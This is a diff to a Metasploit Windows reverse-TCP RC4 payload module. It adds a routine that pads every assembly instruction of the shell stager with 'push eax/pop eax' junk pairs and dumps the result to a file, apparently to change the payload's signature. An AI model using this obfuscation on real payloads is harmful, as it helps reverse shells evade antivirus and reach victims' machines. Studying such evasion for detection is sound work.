@@ -10,6 +10,29 @@ module Msf
 
 module Payload::Windows::ReverseTcpRc4
 
+
+  def add_pusheax_popeax_to_each_instruction(orig_asm)
+    ret = ""
+    orig_asm.each_line do |line|
+      line = line.strip
+      if line == ""
+        next 
+      end
+
+      ret += line
+      ret += "\n"
+      if not line.match(/^\s*;.*/)
+        ret += "push eax\n"
+        ret += "pop eax\n"
+        ret += "\n"
+      end
+    end
+    return ret
+  end
+
+
+
+
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseTcp
   include Msf::Payload::Windows::Rc4
@@ -50,6 +73,10 @@ module Payload::Windows::ReverseTcpRc4
       #{asm_reverse_tcp(opts)}
       #{asm_block_recv_rc4(opts)}
     ^
+
+    combined_asm = add_pusheax_popeax_to_each_instruction(combined_asm)
+    File.open('last_asm.asm', 'w') { |file| file.write(combined_asm) }
+
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
 
